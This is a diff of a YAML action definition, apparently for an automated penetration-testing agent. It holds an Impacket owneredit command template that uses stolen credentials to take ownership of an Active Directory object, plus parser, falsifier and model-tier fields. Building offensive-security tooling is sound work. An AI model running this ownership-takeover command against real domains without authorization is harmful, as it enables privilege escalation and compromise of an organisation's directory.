@@ -6,8 +6,8 @@ preconditions:
 - has_cred
 parameters:
   target_ip: from_engagement.target_ip
-command_template: impacket-owneredit '{domain}/{username}:{password}' -target '{target_dn}'
-  -new-owner '{username}' -dc-ip {target_ip}
+command_template: impacket-owneredit '{domain}/{username}:{password}' -target '{target_dn}' -new-owner '{username}' -dc-ip
+  {target_ip}
 parser: generic_parser
 expected_effects:
 - action_completed
@@ -15,6 +15,9 @@ falsifier:
   pattern: error|failed|refused|denied
   timeout: 30
 model_tier: haiku
-mechanism: I’ll use an Impacket example script, owneredit.py to modify the owner.
-  I’ve installed Impacket with pipx as well, so all the example scripts are just in
-  my path and can be run directly. owneredit.py pipx
+mechanism: "I\u2019ll use an Impacket example script, owneredit.py to modify the owner. I\u2019ve installed Impacket with\
+  \ pipx as well, so all the example scripts are just in my path and can be run directly. owneredit.py pipx"
+references:
+  ocd_mindmap_node_ids:
+  - 871e877a75
+  - cbffbd4d28
